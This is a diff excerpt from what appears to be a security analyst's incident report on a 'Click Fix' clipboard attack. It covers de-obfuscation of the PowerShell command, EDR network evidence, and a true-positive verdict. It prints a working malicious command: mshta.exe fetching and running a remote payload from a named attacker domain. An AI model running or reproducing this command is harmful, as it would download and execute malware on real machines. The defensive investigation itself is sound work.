@@ -47,8 +47,8 @@ Process execution logs captured the execution of a clipboard-based "Click Fix" p
 
 Command De-obfuscationThe PowerShell command used string replacement (-replace ']') to stripped out bracket characters, effectively reconstituting and executing:DOSmshta.exe [https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4](https://overcoatpassably.shop/Z8UZbPyVpGfdRS/maloy.mp4)
 📡 Network Connection EvidenceEDR network connection logs confirmed outbound HTTP communication initiated by mshta.exe connecting to overcoatpassably.shop at 23:26:32 to download and execute maloy.mp4.
----
 
+---
 ## 4. Verdict & Determination
 Final Verdict: True Positive (TP)
 Justification: Host-level forensic evidence confirms successful delivery, link navigation, payload de-obfuscation, process execution, and outbound command-and-control (C2) communication.
